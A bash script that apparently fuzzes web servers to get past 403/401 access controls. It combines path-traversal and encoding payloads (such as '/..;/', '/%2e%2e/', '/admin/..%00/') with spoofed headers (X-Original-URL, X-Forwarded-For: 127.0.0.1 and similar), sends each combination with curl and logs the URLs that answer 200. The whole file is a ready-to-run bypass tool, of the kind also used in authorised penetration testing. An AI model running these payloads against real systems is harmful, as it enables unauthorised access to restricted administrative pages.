#!/bin/bash

# Color codes
GREEN='[0;32m'
YELLOW='[1;33m'
RED='[0;31m'
CYAN='[0;36m'
NC='[0m'

# Paths to fuzz
PATH_PAYLOADS=(
    ""
    "/"
    "/admin"
    "/admin/"
    "/%2e/"
    "/..;/"
    "/./"
    "/%2e%2e/"
    "/admin/..%00/"
)

# Headers to fuzz
HEADER_PAYLOADS=(
"X-Original-URL: /"
"X-Rewrite-URL: /"
"X-Custom-IP-Authorization: 127.0.0.1"
"X-Forwarded-For: 127.0.0.1"
"X-Remote-IP: 127.0.0.1"
"X-Originating-IP: 127.0.0.1"
"X-Forwarded-Host: 127.0.0.1"
"X-Host: 127.0.0.1"
"X-Forwarded-Server: 127.0.0.1"
"Referer: https://google.com"
"X-HTTP-Method-Override: GET"
"X-Forwarded-Proto: https"
)

LOG_FILE="results.txt"
> $LOG_FILE  # Clear previous log

# Function to test single URL + path + header
test_bypass() {
    full_url="$1$2"
    header="$3"
    key=$(echo "$header" | cut -d':' -f1)
    code=$(curl -k -s -o /dev/null -w "%{http_code}" -H "$header" "$full_url")

    if [[ "$code" == "200" ]]; then
        echo -e "${GREEN}[200] $full_url | $key → SUCCESS${NC}"
        echo "[200] $full_url | $key" >> $LOG_FILE
    elif [[ "$code" == "403" || "$code" == "401" ]]; then
        echo -e "${YELLOW}[$code] $full_url | $key → Blocked${NC}"
    else
        echo -e "${RED}[$code] $full_url | $key → Failed${NC}"
    fi
}

# Main runner
run_all() {
    for base_url in "${URLS[@]}"; do
        echo -e "${CYAN}[*] Testing: $base_url${NC}"
        for path in "${PATH_PAYLOADS[@]}"; do
            for header in "${HEADER_PAYLOADS[@]}"; do
                test_bypass "$base_url" "$path" "$header"
            done
        done
        echo ""
    done
}

# Check arguments
if [[ -z "$1" ]]; then
    echo -e "${YELLOW}[!] Usage: $0 <url> or $0 -f <url_file>${NC}"
    exit 1
fi

# Load URLs
if [[ "$1" == "-f" && -n "$2" ]]; then
    mapfile -t URLS < "$2"
else
    URLS=("$1")
fi

# Start
run_all

# Summary
echo -e "
${CYAN}[✓] Finished. Successful attempts saved in ${LOG_FILE}${NC}"
